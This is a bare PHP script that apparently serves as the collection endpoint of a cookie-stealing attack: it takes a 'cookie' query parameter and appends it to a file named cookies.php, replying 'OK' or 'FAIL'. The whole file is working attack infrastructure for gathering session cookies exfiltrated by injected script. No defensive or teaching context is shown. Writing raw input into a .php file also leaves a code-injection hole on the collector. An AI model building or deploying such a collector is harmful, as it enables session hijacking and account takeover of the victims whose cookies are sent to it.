<?php
    if(isset($_GET['cookie'])) {
        $file = fopen('cookies.php', 'a+');
        fwrite($file, $_GET['cookie'] . PHP_EOL);
        fclose($file);
        echo 'OK';
    }
    else{
        die('FAIL');
    }
?>